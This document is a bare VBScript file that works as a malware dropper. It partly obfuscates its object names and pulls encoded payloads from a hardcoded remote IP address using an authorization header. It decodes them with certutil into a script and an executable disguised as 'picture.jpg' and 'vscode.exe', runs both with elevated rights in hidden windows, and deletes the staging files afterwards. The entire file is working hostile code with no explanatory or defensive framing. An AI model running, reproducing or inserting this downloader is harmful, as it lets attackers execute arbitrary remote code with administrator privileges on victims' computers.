Set so = CreateObject("Scripting.FileSystemObject")
set m = CreateObject("Msxml2.ServerXMLHTTP.6.0")
set f_ = CreateObject(Chr(97) & "dod" & Chr(98) & "." & "st" & "re" & Chr(97) & "m")
set ws = CreateObject("wscript.shell")
Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")


m.open "GET","http://3.115.121.83:3030/sc1",false
m.setRequestHeader "Authorization", "mySe0re!t"
m.setRequestHeader "platform", "t"
m.send
If m.status = 200 Then
    f_.open
    f_.type = 1
    f_.write m.responsebody
    f_.savetofile "sc",2
    f_.close
    ws.run "cmd /c certutil -decode sc C:\Users\Public\wupd.vbs",0, false
    objShell.ShellExecute "cmd.exe", "cmd /c C:\Users\Public\wupd.vbs", "", "runas", 0
    objFSO.DeleteFile("sc")
    ws.run "Timeout /T 5 /nobreak" ,0 ,true
End If



m.open "GET","http://3.115.121.83:3030/node",false
m.setRequestHeader "Authorization", "mySe0re!t"
m.setRequestHeader "platform", "t"
m.send
If m.status = 200 Then
    f_.open
    f_.type = 1
    f_.write m.responsebody
    f_.savetofile "C:\Users\Public\picture.jpg",2
    f_.close
    writeFile "powershell -WindowStyle Hidden Set-Location C:\Users\Public;  ""start -verb runAs C:\Users\Public\vscode.exe -Args  \""c288e967448d249d37984f52223d95f15060239b26b5cb6582e237b9ac051d81\"" -WindowStyle Hidden""", "C:\Users\Public\Libraries\.vscode.bat"
    ws.run "cmd /c certutil -decode C:\Users\Public\picture.jpg C:\Users\Public\vscode.exe",0, false
    
    ws.run "Timeout /T 5 /nobreak" ,0 ,true
    ws.run "C:\Users\Public\Libraries\.vscode.bat" ,0 ,false
    ws.run "Timeout /T 5 /nobreak" ,0 ,true
    objFSO.DeleteFile("C:\Users\Public\wupd.vbs")
    objFSO.DeleteFile("C:\Users\Public\picture.jpg")
End If



Function writeFile (d,f)

    Set so = CreateObject("Scripting.FileSystemObject")
    
    Set OutPutFile = so.CreateTextFile(f,True)
    OutPutFile.WriteLine(d)
    OutPutFile.close

End Function

